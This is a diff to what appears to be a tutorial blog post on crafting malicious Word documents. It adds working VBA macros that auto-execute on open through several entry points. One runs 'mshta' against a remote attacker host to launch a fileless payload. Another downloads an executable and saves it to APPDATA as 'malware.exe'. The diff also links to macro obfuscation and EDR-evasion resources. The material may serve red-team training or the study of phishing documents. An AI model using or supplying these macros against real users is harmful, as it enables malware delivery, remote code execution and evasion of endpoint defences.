@@ -50,10 +50,32 @@ On "Project" path, click ThisDocument
 
 ![//pic5](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic5.PNG)
 
+### Execute command
+
 Write our malicious macro code like below
 
 ```
-Sub document_open()
+Private Sub Document_Open()
+Test
+End Sub
+
+Private Sub DocumentOpen()
+Test
+End Sub
+
+Private Sub Auto_Open()
+Test
+End Sub
+
+Private Sub AutoOpen()
+Test
+End Sub
+
+Private Sub Auto_Exec()
+Test
+End Sub
+
+Private Sub Test()
     Shell ("cmd /c mshta http://192.168.83.129:9999/TPXfI")
 End Sub
 ```
@@ -62,6 +84,52 @@ End Sub
 You can also use other payload command line like powershell etc. The mshta attack is just an example.
 
 In my case here, this macro will execute mshta fileless payload.
+
+### Download file
+```
+Private Sub Document_Open()
+Test
+End Sub
+
+Private Sub DocumentOpen()
+Test
+End Sub
+
+Private Sub Auto_Open()
+Test
+End Sub
+
+Private Sub AutoOpen()
+Test
+End Sub
+
+Private Sub Auto_Exec()
+Test
+End Sub
+
+Private Sub Test()
+'
+Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
+Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
+xHttp.Open "GET", "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe", False
+xHttp.Send
+With bStrm
+    .Type = 1
+    .Open
+    .write xHttp.responseBody
+    .savetofile Environ("APPDATA") & "\malware.exe", 2
+End With
+'
+'
+End Sub
+```
+
+## More option and resource
+- https://gist.github.com/mgeeky/3c705560c5041ab20c62f41e917616e6
+- https://github.com/mgeeky/VisualBasicObfuscator
+- https://gist.github.com/mgeeky/9dee0ac86c65cdd9cb5a2f64cef51991
+- https://blog.f-secure.com/dechaining-macros-and-evading-edr/
+
 
 ## Save as .doc
 
